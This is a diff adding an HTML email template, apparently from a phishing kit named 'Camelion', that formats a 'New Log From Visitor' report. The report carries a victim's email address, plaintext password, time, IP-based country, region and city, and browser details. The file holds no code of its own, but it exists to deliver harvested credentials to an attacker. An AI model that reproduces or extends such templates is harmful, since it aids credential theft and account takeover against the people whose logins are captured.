@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camelion</title>
+</head>
+<body style="font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 0;">
+  <div style="max-width: 600px; margin: 0 auto; margin-top: 10px;">
+    <div style="background-color: #007bff; color: #fff; padding: 1px; text-align: center;">
+      <h4>Log Information</h4>
+    </div>
+    <div style="background-color: #fff; padding: 20px;">
+      <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+        <tr>
+          <th style="border: 1px solid #ddd; padding: 8px; text-align: left; background-color: #f2f2f2;">Email</th>
+          <td style="border: 1px solid #ddd; padding: 8px; text-align: left;">{{email}}</td>
+        </tr>
+        <tr>
+          <th style="border: 1px solid #ddd; padding: 8px; text-align: left; background-color: #f2f2f2;">Subject </th>
+          <td style="border: 1px solid #ddd; padding: 8px; text-align: left;">New Log From Visitor | Normal 2D | {{email}}</td>
+        </tr>
+        <tr>
+          <th style="border: 1px solid #ddd; padding: 8px; text-align: left; background-color: #f2f2f2;">Message:</th>
+          <td style="border: 1px solid #ddd; padding: 8px; text-align: left;">
+            <p style="font-weight: bold; color: rgb(207, 83, 83);">Details of a login</p>
+            <p>Email Address: {{email}}</p>
+            <p>Password: <span style="font-weight: bold;">{{password}}</span></p>
+            <p>Time Received: {{time}}</p>
+          </td>
+        </tr>
+        <tr>
+          <th style="border: 1px solid #ddd; padding: 8px; text-align: left; background-color: #f2f2f2;">Location:</th>
+          <td style="border: 1px solid #ddd; padding: 8px; text-align: left;">
+            This visitor visited from {{country}}, {{region}}, {{city}}, with ip of - {{ip_address}}
+            </td>
+        </tr>
+        <tr>
+          <th style="border: 1px solid #ddd; padding: 8px; text-align: left; background-color: #f2f2f2;">Browser-Details:</th>
+          <td style="border: 1px solid #ddd; padding: 8px; text-align: left;">
+            <p><span style="font-weight: bold;">Browser Name:</span> {{browser}}</p>
+            <p><span style="font-weight: bold;">Browser Version:</span> {{b_version}}</p>
+            <p><span style="font-weight: bold;">Browser User Agent:</span> {{agent}}</p>
+          </td>
+        </tr>
+      </table>
+    </div>
+  </div>
+</body>
+</html>
